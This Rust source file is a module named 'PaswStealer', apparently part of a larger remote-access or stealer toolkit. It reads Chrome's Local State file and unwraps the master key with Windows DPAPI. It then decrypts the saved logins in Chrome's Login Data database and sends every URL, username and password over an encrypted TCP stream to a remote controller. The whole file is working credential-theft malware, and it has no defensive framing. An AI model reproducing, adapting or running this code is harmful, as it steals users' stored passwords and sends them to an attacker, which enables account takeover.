use std::slice;
use std::{ptr::null_mut, sync::Arc};
use aes_gcm::{aead::{Aead, generic_array::GenericArray}, Aes256Gcm, KeyInit};
use rusqlite::OpenFlags;
use shared::{encrypted_write_from_key, DataPacket, ModuleType, StatusType};
use tokio::{fs::{self, try_exists}, io::AsyncReadExt, net::tcp::OwnedWriteHalf, sync::{watch, Mutex}};
use base64::{Engine as _, engine::general_purpose};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};


pub struct PaswStealer {
    pub stream_write: Arc<Mutex<OwnedWriteHalf>>,
    pub key: [u8; 32],
    pub notifier: watch::Sender<StatusType>,
}
#[derive(Debug)]
struct Login {
    action_url: String,
    username: String,
    ciphertext: Vec<u8>
}

#[derive(Debug)]
pub struct PlainLogin {
    action_url: String,
    username: String,
    password: String
}



impl PaswStealer {
    pub async fn send_logins(&self) -> std::io::Result<()>{
        let plogins = fetch_logins().await?;


        for login in plogins {
            let mut data: Vec<u8> = vec![];
            data.push(login.action_url.len() as u8);
            data.extend(login.action_url.as_bytes());
            data.push(login.username.len() as u8);
            data.extend(login.username.as_bytes());
            data.push(login.password.len() as u8);
            data.extend(login.password.as_bytes());
            println!("len: {}", data.len());

            let payload = DataPacket {
                module_type: ModuleType::PaswStealer,
                data
            };
            encrypted_write_from_key(self.stream_write.clone(), &self.key, payload).await?;
        }



        Ok(())
    }
}

async fn fetch_logins() -> std::io::Result<Vec<PlainLogin>> {
    let mut plaintext_logins: Vec<PlainLogin> = vec![];

    let key = GenericArray::from_slice(get_pasw_key().await?);
    let logins = get_stored_creds().await?;
    for login in logins {
        let init_vector = GenericArray::from_slice(&login.ciphertext[3..15]);
        let enc_pasw = &login.ciphertext[15..];
        let cipher = Aes256Gcm::new(key);
        let dec = cipher.decrypt(init_vector, enc_pasw);
        match dec {
            Ok(pt) => {
                if let Ok(password) = String::from_utf8(pt.to_vec()) {
                    let plogin = PlainLogin {
                        action_url: login.action_url,
                        username: login.username,
                        password
                    };
                    if plogin.action_url.len() == 0 && plogin.password.len() == 0 && plogin.username.len() == 0 {
                        continue
                    };
                    plaintext_logins.push(plogin)
                }
            }   
            Err(e) => println!("Error decrypting: {}", e)
        }

    }
    


 Ok(plaintext_logins) 
}

async fn get_stored_creds() -> std::io::Result<Vec<Login>> {
    let local_dir = dirs::cache_dir();
    if local_dir.is_none() {
        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Could not find appdata/local directory"))
    }

    let dbpath = local_dir.unwrap().join("Google/Chrome/User Data/Default/Login Data");
    try_exists(&dbpath).await?;


    let db = rusqlite::Connection::open_with_flags(dbpath, OpenFlags::SQLITE_OPEN_READ_ONLY);
    if db.is_err() {
        return Err(std::io::Error::new(std::io::ErrorKind::PermissionDenied, format!("Could not find open db: {:?}", db.err().unwrap())));
    }
    let db = db.unwrap();

    let mut stmt = db.prepare("SELECT action_url, username_value, password_value FROM logins").unwrap();
    let logins = stmt.query_map([], |row| {
        Ok(Login {
            action_url: row.get(0).unwrap(),
            username: row.get(1).unwrap(),
            ciphertext: row.get(2).unwrap()
        })
    }).unwrap();

    let mut res: Vec<Login> = vec![];
    let mut iter = logins.into_iter();
    while let Some(Ok(login)) = iter.next() {
        res.push(login)
    }

    Ok(res)
}


async fn get_pasw_key<'a>() -> std::io::Result<&'a[u8]>{
    let local_dir = dirs::cache_dir();
    if local_dir.is_none() {
        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Could not find appdata/local directory"))
    }

    let localstate_path = local_dir.unwrap().join("Google/Chrome/User Data/Local State"); //filepath where enc located

    try_exists(&localstate_path).await?;

    let mut local_state = fs::File::options().read(true).open(localstate_path).await?;
    let mut buffer = String::new();
    local_state.read_to_string(&mut buffer).await?;
    let parsed_local_state = jzon::parse(&buffer);
    if parsed_local_state.is_err() {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "Could not parse local state"))
    }

    let parsed_local_state = parsed_local_state.unwrap();
    let enc_key = parsed_local_state["os_crypt"]["encrypted_key"].as_str();
    if enc_key.is_none() {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "Could not parse encrypted key"))
    }

    let key = general_purpose::STANDARD.decode(enc_key.unwrap());
    if key.is_err() {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "Could not decode key"))
    }

    let mut key = key.unwrap().into_iter().skip(5).collect::<Vec<u8>>();
    let key_in = CRYPT_INTEGER_BLOB {
        cbData: key.len() as u32,
        pbData: key.as_mut_ptr()
    };
    let mut key_out = CRYPT_INTEGER_BLOB { cbData: 0, pbData: null_mut() };
    unsafe {
        let out = CryptUnprotectData(&key_in, None,None, None, None, 0, &mut key_out);
        if out.is_err() {
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "Unable to decrypt key using windows"));
        }
    }

    let key_final = unsafe { slice::from_raw_parts(key_out.pbData, key_out.cbData as usize) };

    return Ok(key_final);
}






